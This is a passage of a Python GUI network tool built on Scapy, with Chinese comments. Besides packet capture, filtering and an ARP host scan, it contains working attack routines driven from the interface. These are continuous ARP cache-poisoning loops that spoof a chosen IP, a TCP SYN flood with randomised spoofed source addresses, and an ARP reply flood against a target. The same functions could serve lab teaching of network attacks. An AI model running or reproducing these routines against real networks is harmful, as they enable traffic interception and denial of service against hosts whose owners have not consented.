                self.tableWidget_4.setItem(row,3,QTableWidgetItem(scanner[host][proto][port]['name']))#端口提供的服务
                row = row+1
    def start_cap(self):
        self.store = []#存储包
        if self.p:
            self.filtering = 'ether'
        self.hex = []#存储十六进制形式，构成列表
        self.row = 0
        self.thread8 = Thread_detect()
        self.thread8.start()
        self.thread8.signal.connect(self.start)

    def start(self):
        self.queue = Queue()#存储捕获包的队列
        self.NIC = self.comboBox.currentText()
        self.flag = True
        conf.promisc = True#设置网卡的混杂模式
        self.thread99 = Thread(target=self.sniff_packets)
        self.thread99.start()
        self.thread178 = Thread(target=self.start_sniffer)
        self.thread178.start()

    def start_sniffer(self):
        self.packets = sniff(filter=self.filtering, iface=self.NIC, store=True, prn=self.packet_handle,stop_filter=self.stop_s)
    def choosewhich(self,row,column):#选中tablewidget的某一行，主要使用选中的行号
        self.thread299 = Thread(target=self.textEdit1(row))
        self.thread299.start()
        self.thread300 = Thread(target=self.textEdit2(row))
        self.thread300.start()
    def textEdit1(self,row):
        self.textEdit.clear()#首先清楚上一个点击事件生成的内容
        self.textEdit.append(self.hex[row])#将hex列表中的元素显示在控件上

    def packet_handle(self,packet):
        self.queue.put(packet)#抓包的回调函数，将捕获的包入列

    def process_packet(self, packet):
        self.tableWidget.setRowCount(self.tableWidget.rowCount() + 1)
        time_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(packet.time))
        self.tableWidget.setItem(self.row, 0, QTableWidgetItem(str(time_str)))
        self.tableWidget.setItem(self.row, 1, QTableWidgetItem(str(packet.src)))
        self.tableWidget.setItem(self.row, 2, QTableWidgetItem(str(packet.dst)))
        self.tableWidget.setItem(self.row, 3, QTableWidgetItem(str(packet.type)))
        self.tableWidget.setItem(self.row, 4, QTableWidgetItem(str(packet.summary())))
        self.row = self.row + 1
        self.store.append(packet_handle(packet))
        self.hex.append(binascii.hexlify(bytes(packet)).decode('utf-8'))

    def textEdit2(self,row):
        self.textEdit_2.clear()
        self.textEdit_2.append(self.store[row])
    def stop_s(self,pac):
       if self.flag:
           return False
       else:
           return True

    def sniff_packets(self):#循环处理包函数
        while self.flag:
            if not self.queue.empty():
                packet = self.queue.get()
                self.process_packet(packet)

    def set_filter(self):
        self.p = False
        self.thread1 = Thread_detect()
        self.thread1.start()
        self.thread1.signal.connect(self.filter)

    def filter(self):
        list = ["指定源IP地址", "指定目的IP地址", "指定源端口", "指定目的端口", "指定协议类型", "自定义规则"]
        item, ok = QInputDialog.getItem(self, "选项", "规则列表", list, 1, False)
        if ok:
            if item == "指定源IP地址":
                filter, ok_1 = QInputDialog.getText(self, "标题", "请输入指定源IP地址:", QLineEdit.Normal, "*.*.*.*")
                rule = "src " + filter
            elif item == "指定目的IP地址":
                filter, ok_2 = QInputDialog.getText(self, "标题", "请输入指定目的IP地址:", QLineEdit.Normal, "*.*.*.*")
                rule = "dst " + filter
            elif item == "指定源端口":
                filter, ok_3 = QInputDialog.getInt(self, "标题", "请输入指定源端口:", 80, 0, 65535)
                rule = "src port " + str(filter)
            elif item == "指定目的端口":
                filter, ok_4 = QInputDialog.getInt(self, "标题", "请输入指定目的端口:", 80, 0, 65535)
                rule = "dst port " + str(filter)
            elif item == "指定协议类型":
                filter, ok_2 = QInputDialog.getText(self, "标题", "请输入指定协议类型:", QLineEdit.Normal, "tcp")
                rule = filter
            elif item == "自定义规则":
                filter, ok_2 = QInputDialog.getText(self, "标题", "请输入规则:", QLineEdit.Normal, "host 202.120.2.1")
                rule = filter
            rule = rule.lower()
            self.filtering = rule

    def stop_cap(self):
        self.flag = False

    def save(self):
        self.thread6 = Thread_detect()
        self.thread6.start()
        self.thread6.signal.connect(self.savef)

    def savef(self):
        for pac in self.packets:
            wrpcap('capture.pcap', pac, append=True)

    def clear(self):
        self.thread7 = Thread_detect()
        self.thread7.start()
        self.thread7.signal.connect(self.clearall)

    def clearall(self):
        self.tableWidget.clearContents()
        self.tableWidget.setRowCount(0)
        self.textEdit_2.clear()
        self.textEdit.clear()

    def start_scan(self):
        self.NIC2 = self.choose_eth.currentText()
        self.net2 = self.textEdit_6.toPlainText()
        self.threadl21 = Thread(target=self.scan)
        self.threadl21.start()

    def scan(self):

        self.ip2 = get_if_addr(self.NIC2)
        self.mac2 = get_if_raw_hwaddr(self.NIC2)[1]

        network = Generate_ip(self.net2)

        for address in network:
            packet = Ether(dst='ff:ff:ff:ff:ff:ff', src=self.mac2) / ARP(op=1, psrc=self.ip2, hwsrc=self.mac2,
                                                                        hwdst='ff:ff:ff:ff:ff:ff',
                                                                        pdst=address, ptype=2048, hwlen=6, plen=4)
            self.textEdit_8.append(packet.summary())
            time.sleep(0.3)
        row = 0
        broadcast = "FF:FF:FF:FF:FF:FF"
        ether_layer = Ether(dst=broadcast)
        ip_range = self.net2
        arp_layer = ARP(pdst=ip_range)
        packet = ether_layer / arp_layer
        self.ans, unans = srp(packet, iface=self.NIC2, timeout=5)
        for snd, rcv in self.ans:
            self.tableWidget_2.setRowCount(self.tableWidget_2.rowCount() + 1)
            ip = rcv[ARP].psrc
            mac = rcv[Ether].src
            self.tableWidget_2.setItem(row, 0, QTableWidgetItem(str(row + 1)))
            self.tableWidget_2.setItem(row, 1, QTableWidgetItem(str(ip)))
            self.tableWidget_2.setItem(row, 2, QTableWidgetItem(str(mac)))
            row = row + 1

    def send_reply(self):
        self.flag3 = True

        self.dest_macl3 = self.textEdit_4.toPlainText()
        self.dest_ipl3 = self.textEdit_3.toPlainText()
        # 想要伪装的地址
        self.wifil3 = self.choose_eth_7.currentText()
        self.fake_ipl3 = self.textEdit_7.toPlainText()
        self.threadl31 = Thread(target=self.reply_send)
        self.netl3 = self.textEdit_47.toPlainText()
        self.threadl31.start()
    def reply_send(self):
        self.ipl3 = get_if_addr(self.wifil3)
        self.macl3 = get_if_raw_hwaddr(self.wifil3)[1]
        times = 1
        while self.flag3:
            packet2 = Ether(src=self.macl3, dst=self.dest_macl3, type=0x0806) / ARP(op=2, pdst=self.dest_ipl3,
                                                                                psrc=self.fake_ipl3,
                                                                                hwsrc=self.macl3,
                                                                                hwdst=self.dest_macl3,
                                                                                ptype=2048, hwlen=6, plen=4)
            sendp(packet2, iface=self.wifil3)
            if times % 10 == 0:
                self.textEdit_48.append(packet2.summary())
            times = times + 1
    def send_request(self):
        self.wifil3 = self.choose_eth_7.currentText()
        self.dest_macl3 = self.textEdit_4.toPlainText()
        self.fake_ipl3 = self.textEdit_7.toPlainText()
        self.dest_ipl3 = self.textEdit_3.toPlainText()
        self.netl3 = self.textEdit_47.toPlainText()
        self.flag4 = True
        self.threadl32 = Thread(target=self.packet_send)
        self.threadl32.start()

    def packet_send(self):
        times = 1
        while self.flag4:
            src_net = Generate_ip(self.netl3)
            dst_ip = src_net[random.randint(1, src_net.num_addresses - 1)]
            packet = Ether(src=self.dest_macl3, dst='ff:ff:ff:ff:ff:ff', type=0x0806) / ARP(op=1, pdst=dst_ip,
                                                                                  psrc=self.dest_ipl3, hwsrc=self.dest_macl3,
                                                                                  hwdst='ff:ff:ff:ff:ff:ff',
                                                                                  ptype=2048, hwlen=6, plen=4)
            sendp(packet, iface=self.wifil3)
            if times%10==0:
                self.textEdit_49.append(packet.summary())
            times = times + 1

    def stop_foolattack(self):
        self.flag3 = False
        self.flag4 = False

    def start_syn(self):
        self.wifil4 = self.choose_eth_6.currentText()
        self.dst_ipl4 = self.textEdit_37.toPlainText()
        self.dst_macl4 = self.textEdit_43.toPlainText()
        self.netl4 = self.textEdit_42.toPlainText()
        self.portl4 = int(self.textEdit_41.toPlainText())
        self.threadl41 = Thread(target = self.send_syn)
        self.flag5 = True
        self.threadl41.start()

    def send_syn(self):
        times = 1
        while self.flag5:
            src_mac = Generate_mac()
            src_net = Generate_ip(self.netl4)
            src_ip = src_net[random.randint(1, src_net.num_addresses - 2)]
            src_port = RandShort()
            seq_num = RandNum(0, 4294967295)
            tcp_win = RandShort()
            packet = Ether(src=src_mac, dst=self.dst_macl4) / IP(dst=self.dst_ipl4, src=src_ip) / TCP(dport=self.portl4,
                                                                                                  sport=src_port,
                                                                                                  seq=seq_num,
                                                                                                  flags="S",
                                                                                                  window=tcp_win)

            sendp(packet*10, iface=self.wifil4)
            if times % 10 == 0:
                self.textEdit_38.append(packet.summary())
            times = times + 1

    def stop_flood(self):
        self.flag5 = False
        self.flag6= False

    def start_arpflood(self):
        self.wifil4 = self.choose_eth_6.currentText()
        self.dst_ipl4 = self.textEdit_37.toPlainText()
        self.dst_macl4 = self.textEdit_43.toPlainText()
        self.netl4 = self.textEdit_42.toPlainText()
        self.portl4 = int(self.textEdit_41.toPlainText())
        self.flag6 = True
        self.threadl42 = Thread(target= self.send_arp)
        self.threadl42.start()

    def send_arp(self):
        times = 1
        while self.flag6:
            src_mac = Generate_mac()
            src_net = Generate_ip(self.netl4)
            src_ip = src_net[random.randint(1, src_net.num_addresses - 2)]
            packet = Ether(src=src_mac, dst=self.dst_macl4, type=0x0806) / ARP(op=2, pdst=self.dst_ipl4,
                                                                             psrc=src_ip, hwsrc=src_mac,
                                                                             hwdst=self.dst_macl4,
                                                                             ptype=2048, hwlen=6, plen=4)
            sendp(packet*10, iface=self.wifil4)
            if times % 10 == 0:
                self.textEdit_39.append(packet.summary())
            times = times + 1